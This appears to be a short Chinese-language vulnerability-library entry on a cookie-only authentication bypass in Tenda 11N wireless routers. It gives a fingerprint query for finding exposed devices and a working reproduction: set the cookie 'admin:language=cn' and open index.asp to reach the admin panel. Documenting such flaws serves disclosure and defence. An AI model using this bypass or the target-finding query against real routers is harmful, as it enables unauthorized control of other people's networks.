# Tenda 11N无线路由器 Cookie 越权访问漏洞

## 漏洞描述

Tenda 11N无线路由器由于只验证Cookie，导致任意用户伪造Cookie即可进入后台

## 漏洞影响

<a-checkbox checked>Tenda 11N无线路由器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TENDA-11N无线路由器"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1646009335970-22d7f17e-3801-4d3b-bf5a-e7fa2b17749f.png)

添加Cookie, 访问 index.asp 进入后台

```javascript
admin:language=cn
```

![img](../../../.vuepress/public/img/1646009376481-0c885988-16f4-4a01-bd46-5d126a6b9d8d.png)



